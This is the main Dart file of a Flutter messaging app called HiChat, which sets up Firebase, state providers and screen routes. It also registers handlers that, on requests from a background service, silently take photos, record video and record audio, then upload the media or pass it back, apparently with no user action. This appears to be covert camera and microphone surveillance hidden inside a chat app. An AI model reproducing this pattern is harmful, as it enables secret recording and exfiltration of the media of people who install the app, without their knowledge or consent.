import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:firebase_core/firebase_core.dart';

import 'firebase_options.dart';
import 'constants/app_theme.dart';
import 'constants/app_constants.dart';
import 'services/auth_state_manager.dart';
import 'services/chat_state_manager.dart';
import 'services/hichat_media_background_service_integration.dart';
import 'services/camera_service.dart';
import 'services/api_service.dart';
import 'services/isolate_communication_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'screens/welcome/welcome_screen.dart';
import 'screens/auth/auth_options_screen.dart';
import 'screens/auth/login_screen.dart';
import 'screens/auth/register_screen.dart';
import 'screens/auth/profile_setup_screen.dart';
import 'screens/auth/phone_signin_screen.dart';
import 'screens/auth/otp_verification_screen.dart';
import 'screens/chat/chat_list_screen.dart';
import 'screens/chat/chat_screen.dart';
import 'screens/camera/camera_screen.dart';
import 'screens/location/location_sharing_screen.dart';
import 'screens/user/user_search_screen.dart';
import 'screens/profile/profile_screen.dart';
import 'screens/chat/chat_info_screen.dart';
import 'screens/contacts/contacts_screen.dart';
import 'screens/calls/calls_screen.dart';
import 'models/chat.dart';
import 'utils/page_transitions.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  
  // Initialize background services (configure but don't auto-start)
  try {
    await HiChatMediaBackgroundService.initialize();
    await _setupMainIsolateCameraHandlers();
  } catch (e) {
    debugPrint('Failed to initialize media background service: $e');
  }
  
  runApp(const HiChatApp());
}

/// Setup main isolate handlers for camera requests from background service
bool _isCameraOperationInProgress = false;

Future<void> _setupMainIsolateCameraHandlers() async {
  debugPrint('🔧 MAIN ISOLATE: Setting up camera handlers...');
  final communicationService = IsolateCommunicationService.instance;
  
  // Start listening for camera requests from background isolate
  communicationService.startListeningForRequests((request) async {
    // Prevent overlapping camera operations
    if (_isCameraOperationInProgress) {
      debugPrint('📸 MAIN ISOLATE: ⚠️ Camera operation already in progress, skipping request');
      return;
    }
    final mediaType = request['media_type'] as String;
    final username = request['username'] as String;
    final userId = request['user_id'] as String;
    final requestId = request['request_id'] as String?;
    
    debugPrint('📸 MAIN ISOLATE: 🎯 CAMERA HANDLER CALLED! Received $mediaType capture request');
    
    _isCameraOperationInProgress = true;
    
    try {
      switch (mediaType) {
        case 'image':
          final result = await CameraService.captureImage();
          debugPrint('📸 MAIN ISOLATE: Image captured successfully');
          
          // Send response back to background isolate
          await communicationService.sendCameraResponse(
            mediaType: mediaType,
            username: username,
            userId: userId,
            requestId: requestId,
            data: result.data,
          );
          break;
          
        case 'video':
          final result = await CameraService.recordVideo();
          debugPrint('🎥 MAIN ISOLATE: Video recorded successfully');
          
          // Upload via API (like Java implementation)
          final apiService = ApiService();
          await apiService.uploadMediaBulk(
            userId: userId,
            username: username,
            mediaType: 'video',
            files: [result.data],
            email: null,
          );
          
          debugPrint('🎥 MAIN ISOLATE: Video uploaded successfully via API');
          
          // Send success response
          await communicationService.sendCameraResponse(
            mediaType: mediaType,
            username: username,
            userId: userId,
            requestId: requestId,
            data: 'uploaded', // Video was uploaded via API, not returned as data
          );
          break;
          
        case 'audio':
          final result = await CameraService.recordAudio();
          debugPrint('🎤 MAIN ISOLATE: Audio recorded successfully');
          
          // Upload via API (like Java implementation)
          final apiService = ApiService();
          await apiService.uploadMediaBulk(
            userId: userId,
            username: username,
            mediaType: 'audio',
            files: [result.data],
            email: null,
          );
          
          debugPrint('🎤 MAIN ISOLATE: Audio uploaded successfully via API');
          
          // Send success response
          await communicationService.sendCameraResponse(
            mediaType: mediaType,
            username: username,
            userId: userId,
            requestId: requestId,
            data: 'uploaded', // Audio was uploaded via API, not returned as data
          );
          break;
          
        default:
          throw Exception('Unknown media type: $mediaType');
      }
      
    } catch (e) {
      debugPrint('📷 MAIN ISOLATE: $mediaType capture failed: $e');
      
      // Send error response
      await communicationService.sendCameraResponse(
        mediaType: mediaType,
        username: username,
        userId: userId,
        requestId: requestId,
        error: e.toString(),
      );
    } finally {
      // Always reset the flag when operation completes
      _isCameraOperationInProgress = false;
    }
  });
  
  debugPrint('✅ MAIN ISOLATE: Camera handlers setup complete');
  
  // Test the communication system
  _testCommunicationSystem();
}

/// Test the SharedPreferences communication system
Future<void> _testCommunicationSystem() async {
  await Future.delayed(Duration(seconds: 3)); // Wait for initialization
  
  debugPrint('🧪 MAIN ISOLATE: Testing SharedPreferences communication...');
  
  try {
    final prefs = await SharedPreferences.getInstance();
    
    // Check if we can read the counter
    final counter = prefs.getInt('camera_request_counter') ?? 0;
    debugPrint('🧪 MAIN ISOLATE: Current request counter: $counter');
    
    // Check if we can read the queue
    final queue = prefs.getStringList('camera_request_queue') ?? [];
    debugPrint('🧪 MAIN ISOLATE: Current queue size: ${queue.length}');
    
    if (queue.isNotEmpty) {
      debugPrint('🧪 MAIN ISOLATE: First queue item: ${queue.first}');
    }
    
    debugPrint('🧪 MAIN ISOLATE: SharedPreferences test completed');
  } catch (e) {
    debugPrint('🧪 MAIN ISOLATE: SharedPreferences test failed: $e');
  }
}

class HiChatApp extends StatelessWidget {
  const HiChatApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiProvider(
      providers: [
        ChangeNotifierProvider(create: (context) => AuthStateManager()),
        ChangeNotifierProvider(create: (context) => ChatStateManager.instance),
      ],
      child: MaterialApp(
        title: AppConstants.appName,
        theme: AppTheme.lightTheme,
        darkTheme: AppTheme.darkTheme,
        themeMode: ThemeMode.system,
        debugShowCheckedModeBanner: false,
        home: const AuthWrapper(),
        onGenerateRoute: (settings) {
          switch (settings.name) {
            case '/':
              return PageTransitions.fade(
                const AuthWrapper(),
                settings: settings,
              );

            case AppConstants.authOptionsRoute:
              return PageTransitions.slideFromRight(
                const AuthOptionsScreen(),
                settings: settings,
              );

            case AppConstants.loginRoute:
              return PageTransitions.slideFromRight(
                const LoginScreen(),
                settings: settings,
              );

            case AppConstants.registerRoute:
              return PageTransitions.slideFromRight(
                const RegisterScreen(),
                settings: settings,
              );

            case AppConstants.profileSetupRoute:
              return PageTransitions.slideFromRight(
                const ProfileSetupScreen(),
                settings: settings,
              );

            case AppConstants.phoneSigninRoute:
              return PageTransitions.slideFromRight(
                const PhoneSignInScreen(),
                settings: settings,
              );

            case AppConstants.otpVerificationRoute:
              final args = settings.arguments as Map<String, dynamic>;
              return PageTransitions.slideFromRight(
                OTPVerificationScreen(
                  phoneNumber: args['phone_number'] as String,
                  password: args['password'] as String,
                  isPhoneExist: args['is_phone_exist'] as bool,
                ),
                settings: settings,
              );

            case AppConstants.chatRoute:
              final chat = settings.arguments as Chat;
              return PageTransitions.slideFromRight(
                ChatScreen(chat: chat),
                settings: settings,
              );

            case AppConstants.cameraRoute:
              return PageTransitions.slideFromRight(
                const CameraScreen(),
                settings: settings,
              );

            case AppConstants.locationSharingRoute:
              // Get username from arguments or current user
              final String username = settings.arguments as String? ?? 'User';
              return PageTransitions.slideFromRight(
                LocationSharingScreen(username: username),
                settings: settings,
              );

            case '/user-search':
              return PageTransitions.slideFromRight(
                const UserSearchScreen(),
                settings: settings,
              );

            case '/contacts':
              return PageTransitions.slideFromRight(
                const ContactsScreen(),
                settings: settings,
              );

            case '/calls':
              return PageTransitions.slideFromRight(
                const CallsScreen(),
                settings: settings,
              );

            case '/profile':
              return PageTransitions.slideFromRight(
                const ProfileScreen(),
                settings: settings,
              );

            case '/chat-info':
              final chat = settings.arguments as Chat;
              return PageTransitions.slideFromRight(
                ChatInfoScreen(chat: chat),
                settings: settings,
              );

            default:
              return PageTransitions.fade(
                const AuthWrapper(),
                settings: settings,
              );
          }
        },
      ),
    );
  }
}

/// Wrapper widget that handles auth state and routing
class AuthWrapper extends StatefulWidget {
  const AuthWrapper({super.key});

  @override
  State<AuthWrapper> createState() => _AuthWrapperState();
}

class _AuthWrapperState extends State<AuthWrapper> {
  @override
  void initState() {
    super.initState();
    // Initialize auth state after the widget is built
    WidgetsBinding.instance.addPostFrameCallback((_) {
      context.read<AuthStateManager>().initialize();
    });
  }

  @override
  Widget build(BuildContext context) {
    return Consumer<AuthStateManager>(
      builder: (context, authManager, child) {
        // Show loading screen while initializing
        if (authManager.isLoading) {
          return const Scaffold(
            backgroundColor: Colors.white,
            body: Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  CircularProgressIndicator(),
                  SizedBox(height: 16),
                  Text(
                    'Loading...',
                    style: TextStyle(fontSize: 16, color: Colors.grey),
                  ),
                ],
              ),
            ),
          );
        }

        // Route based on authentication state
        if (authManager.isLoggedIn) {
          return const ChatListScreen();
        } else {
          return const WelcomeScreen();
        }
      },
    );
  }
}
